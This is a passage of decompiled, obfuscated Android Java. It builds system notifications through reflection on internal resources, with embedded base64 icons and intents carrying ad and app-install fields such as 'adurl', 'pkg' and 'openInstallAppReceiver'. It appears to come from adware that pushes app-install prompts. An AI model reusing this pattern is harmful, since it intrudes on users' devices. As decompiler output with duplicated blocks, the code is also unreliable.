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"")));           }  catch (          IOException e2) {             e2.printStackTrace();           }           Intent intent=new Intent(context,(Class<?>)knvu.c(context));           intent.setAction(""openInstallAppReceiver"");           intent.putExtra(""pkg"",dVar.h());           PendingIntent broadcast=PendingIntent.getBroadcast(context,b,intent,134217728);           c.contentIntent=broadcast;           c.setLatestEventInfo(context,dVar.a(),dVar.b(),broadcast);           Class<?> cls=Class.forName(""com.android.internal.R$id"");           int i=cls.getField(""title"").getInt(cls);           int i2=cls.getField(""text"").getInt(cls);           c.contentView.setImageViewBitmap(cls.getField(""icon"").getInt(cls),bitmap);           c.contentView.setTextViewText(i,dVar.a());           c.contentView.setTextViewText(i2,dVar.b());           c.contentIntent=broadcast;           d.notify(b,c);         }         bitmap=a2;         Intent intent2=new Intent(context,(Class<?>)knvu.c(context));         intent2.setAction(""openInstallAppReceiver"");         intent2.putExtra(""pkg"",dVar.h());         PendingIntent broadcast2=PendingIntent.getBroadcast(context,b,intent2,134217728);         c.contentIntent=broadcast2;         c.setLatestEventInfo(context,dVar.a(),dVar.b(),broadcast2);         Class<?> cls2=Class.forName(""com.android.internal.R$id"");         int i3=cls2.getField(""title"").getInt(cls2);         int i22=cls2.getField(""text"").getInt(cls2);         c.contentView.setImageViewBitmap(cls2.getField(""icon"").getInt(cls2),bitmap);         c.contentView.setTextViewText(i3,dVar.a());         c.contentView.setTextViewText(i22,dVar.b());         c.contentIntent=broadcast2;         d.notify(b,c);       }  catch (      Exception e3) {         e3.printStackTrace();       }     }  catch (    Exception e4) {       e4.printStackTrace();     }   }   public static void a(  Context context,  f fVar){     int parseInt=Integer.parseInt(fVar.f()) + 20000;     Intent intent=new Intent(context,(Class<?>)knvu.c(context));     intent.setAction(""sadre"");     intent.putExtra(""action"",""swapp"");     intent.putExtra(""adwords"",fVar.b());     intent.putExtra(""title"",fVar.a());     intent.putExtra(""notifyid"",parseInt);     intent.putExtra(""iconid"",R.drawable.ic_menu_share);     intent.putExtra(""pkg"",fVar.e());     intent.putExtra(""adurl"",fVar.d());     intent.putExtra(""downflag"",fVar.h());     NotificationManager notificationManager=(NotificationManager)context.getSystemService(""notification"");     String a2=fVar.a();     String b2=fVar.b();     String c2=fVar.c();     int intExtra=intent.getIntExtra(""iconid"",R.drawable.presence_online);     Bitmap bitmap=null;     try {       try {         if (c2.startsWith(""http://"")) {           c2=h(context,c2);         }         if (!a(c2)) {           intent.putExtra(""image"",c2);           bitmap=BitmapFactory.decodeStream(new ByteArrayInputStream(q.a(c2)));         }         if (bitmap == null) {           try {             bitmap=BitmapFactory.decodeStream(new ByteArrayInputStream(q.a(""iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAMAAAC5zwKfAAAAA3NCSVQICAjb4U/gAAADAFBMVEX////kw5/ewIv43KjvyIHEtZnHqm67YCyrSiDl0KnEtZmUQRv43Kj1zZ3kw5+sUSKrSiCUQRvevIC7YCysUSL1zZ3vyIG7YCysUSK7YCz43Kjl0KnvyIHevICrXCmrSiD1zZ3l0KnvyIG7YCyrXCmsUSKrSiD43KjvyIHeuHu7YCyrXCmrSiD43KjvyIHWrWusUSKrSiD43Kj1zZ3vyIHeuHvbsnHWqWS1aTK7YCyrXCmkUyisUSL////1/v349/bs9ffu7+/s6OTU6vPd5+L437Ts3s/p2fT43KjY3+HM3Nu63+3X09r1zZ2n3Pfl0KnwyLjMzMzvyIHkw5/Gx8H/wDDewIvevIDeuHvKtc7fuF/XtHnXp/rbsnHEtZnNtHso1v9pxeets6vWrWvwpl3qoabWrVnkqzebs77WqWTZqF36pBvHqm7TpVWQuzjGmOqqpp/OoFLPn1zBol/vljabpo0tuvbNmkr3kxITv/kyudqtnYR8rVGqmmxEsMH4f4XHk0fAlFcpsur2iRGnmFuTmJcMtPb4hAXFjEM0uSbUhi2ljGVhpETDhUL2fAsNqfYNq+PdghGuiFDAc/Slf8nDgV2aiXxTl5ZinR2+fTr0cQr1Z26pfVAOn9SvekGDgn20djeFe5G7czcapBPXbQ0QlNLjX2SAeWemcFemZ5lkgHBtfzi1aTIIjr9UhjicbzupaTunWNaMbjq5TfiCbFmWYoYof6P2SVHXUGOqYi65TNhqZKerXCmXYTY/coJOdyexWw2mS9BrZlmkUyiTWDKZVCpbYWCGVzTQPUCiOeccZ6CSUw+nRVerSiCqM/RuWTB9SZuaSyK/KP9UVlwJcQwvYyN4Pcj/IjB7Q3NRVTOKRR/2IzDgKTBNUVmUQRuXK+KpGvh6PBr4FStmPyVrMJn3ESFuNxdYPCqlD/n/ChgzQF/jEB+ZEPiVEucJRm3xCBhgKH7ZDRuWBveHC+vyAAteKg8zMzN7Dc6vDhpSJQ5kCsSVDBaGChQ2HQ9DBKVYBw3KOpWUAAABAHRSTlMAIiIzMzMzMzNERERVVVVVVVVmZmZ3d4iImaqqqqqqqru7u7u7u7vMzMzMzMzd3d3d3e7u7u7u7u7u7u7u////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Tfl3FgAAAAlwSFlzAAALEgAACxIB0t1+/AAAAB90RVh0U29mdHdhcmUATWFjcm9tZWRpYSBGaXJld29ya3MgOLVo0ngAAA0nSURBVFiFfdkJXBNXHgfw7N293fu+u/e2u9vtsdvdmWFiDAWxBY2KIKCAsQgoSajBs4mIyUKDECw2HoFSFbXRxIBSbOJBiIBaMLUKBgERgagoCkYUq+z/vTczmXjsz4hMZuab33tvhk+CEgnJF37yzHPTcF7hMuX/hT/oFXLKc8/96iuSsHzux8++kJSWhJIYHx8/m2TWk0J2w4Hx6Iy0tKQXn//l10TcZ34/OwOSBnuSEhMR+TgxJSVLo8lKQU/zXCLx0tLg7Phnvsx73/hHGueRjvGPdJw9G7C1a4vKy4vWYjJUj/cg079HvM8+T7Y5MfEhj8eK9u/ad/DgwV1FmhQeFBpywPSvY/DX8K1aXFE0i4kpWVkIK9919GDNxzi7irISnwBmPIu8zyephYLCiEGMRxge565dGLtA8vH+tcKgE8PGDM73JZIv/lSNEhJRv8TERA7bv+tojWBdCKAvR4uy+FVOEjVEiPqP35b87K88yA8YBbSinYC1ABYIYCfA/9taq0mJF1UMgeqMl/4gefYlUUESxO3ksKGhISQFRgIXWmvK5pYhtcOclYJfNvHhiuqMFyQvhkYMZJZGr9doNFv2t0CjkZEhlJGRkQDCIimKikQvcMq5xazXZGWByIG8p1YnSBIEMCMjS2PeguKsbR0iGmBDF1rLlkQyFEVHRlJMK4A9x3ZXVBeZAdVkkTEJnjpNwn2HPI1+y/tvQfaeOxUYJdgQqgYYxUbOLWvpYakaeO7CgeXzlq/eWFG9BZoiNVRQnSEC1eD9F2dvzwiAQ/w4AVtS0wP+yFxqLgI/3FMyDwJodS2gSFU/BtQg7z14vHcGwNHRMjROBrB9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"")));             intent.putExtra(""image"",""iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAMAAAC5zwKfAAAAA3NCSVQICAjb4U/gAAADAFBMVEX////kw5/ewIv43KjvyIHEtZnHqm67YCyrSiDl0KnEtZmUQRv43Kj1zZ3kw5+sUSKrSiCUQRvevIC7YCysUSL1zZ3vyIG7YCysUSK7YCz43Kjl0KnvyIHevICrXCmrSiD1zZ3l0KnvyIG7YCyrXCmsUSKrSiD43KjvyIHeuHu7YCyrXCmrSiD43KjvyIHWrWusUSKrSiD43Kj1zZ3vyIHeuHvbsnHWqWS1aTK7YCyrXCmkUyisUSL////1/v349/bs9ffu7+/s6OTU6vPd5+L437Ts3s/p2fT43KjY3+HM3Nu63+3X09r1zZ2n3Pfl0KnwyLjMzMzvyIHkw5/Gx8H/wDDewIvevIDeuHvKtc7fuF/XtHnXp/rbsnHEtZnNtHso1v9pxeets6vWrWvwpl3qoabWrVnkqzebs77WqWTZqF36pBvHqm7TpVWQuzjGmOqqpp/OoFLPn1zBol/vljabpo0tuvbNmkr3kxITv/kyudqtnYR8rVGqmmxEsMH4f4XHk0fAlFcpsur2iRGnmFuTmJcMtPb4hAXFjEM0uSbUhi2ljGVhpETDhUL2fAsNqfYNq+PdghGuiFDAc/Slf8nDgV2aiXxTl5ZinR2+fTr0cQr1Z26pfVAOn9SvekGDgn20djeFe5G7czcapBPXbQ0QlNLjX2SAeWemcFemZ5lkgHBtfzi1aTIIjr9UhjicbzupaTunWNaMbjq5TfiCbFmWYoYof6P2SVHXUGOqYi65TNhqZKerXCmXYTY/coJOdyexWw2mS9BrZlmkUyiTWDKZVCpbYWCGVzTQPUCiOeccZ6CSUw+nRVerSiCqM/RuWTB9SZuaSyK/KP9UVlwJcQwvYyN4Pcj/IjB7Q3NRVTOKRR/2IzDgKTBNUVmUQRuXK+KpGvh6PBr4FStmPyVrMJn3ESFuNxdYPCqlD/n/ChgzQF/jEB+ZEPiVEucJRm3xCBhgKH7ZDRuWBveHC+vyAAteKg8zMzN7Dc6vDhpSJQ5kCsSVDBaGChQ2HQ9DBKVYBw3KOpWUAAABAHRSTlMAIiIzMzMzMzNERERVVVVVVVVmZmZ3d4iImaqqqqqqqru7u7u7u7vMzMzMzMzd3d3d3e7u7u7u7u7u7u7u////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Tfl3FgAAAAlwSFlzAAALEgAACxIB0t1+/AAAAB90RVh0U29mdHdhcmUATWFjcm9tZWRpYSBGaXJld29ya3MgOLVo0ngAAA0nSURBVFiFfdkJXBNXHgfw7N293fu+u/e2u9vtsdvdmWFiDAWxBY2KIKCAsQgoSajBs4mIyUKDECw2HoFSFbXRxIBSbOJBiIBaMLUKBgERgagoCkYUq+z/vTczmXjsz4hMZuab33tvhk+CEgnJF37yzHPTcF7hMuX/hT/oFXLKc8/96iuSsHzux8++kJSWhJIYHx8/m2TWk0J2w4Hx6Iy0tKQXn//l10TcZ34/OwOSBnuSEhMR+TgxJSVLo8lKQU/zXCLx0tLg7Phnvsx73/hHGueRjvGPdJw9G7C1a4vKy4vWYjJUj/cg079HvM8+T7Y5MfEhj8eK9u/ad/DgwV1FmhQeFBpywPSvY/DX8K1aXFE0i4kpWVkIK9919GDNxzi7irISnwBmPIu8zyephYLCiEGMRxge565dGLtA8vH+tcKgE8PGDM73JZIv/lSNEhJRv8TERA7bv+tojWBdCKAvR4uy+FVOEjVEiPqP35b87K88yA8YBbSinYC1ABYIYCfA/9taq0mJF1UMgeqMl/4gefYlUUESxO3ksKGhISQFRgIXWmvK5pYhtcOclYJfNvHhiuqMFyQvhkYMZJZGr9doNFv2t0CjkZEhlJGRkQDCIimKikQvcMq5xazXZGWByIG8p1YnSBIEMCMjS2PeguKsbR0iGmBDF1rLlkQyFEVHRlJMK4A9x3ZXVBeZAdVkkTEJnjpNwn2HPI1+y/tvQfaeOxUYJdgQqgYYxUbOLWvpYakaeO7CgeXzlq/eWFG9BZoiNVRQnSEC1eD9F2dvzwiAQ/w4AVtS0wP+yFxqLgI/3FMyDwJodS2gSFU/BtQg7z14vHcGwNHRMjROBrB9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"");           }  catch (          IOException e2) {             throw e2;           }         }       }  catch (      Throwable th) {         try {           BitmapFactory.decodeStream(new 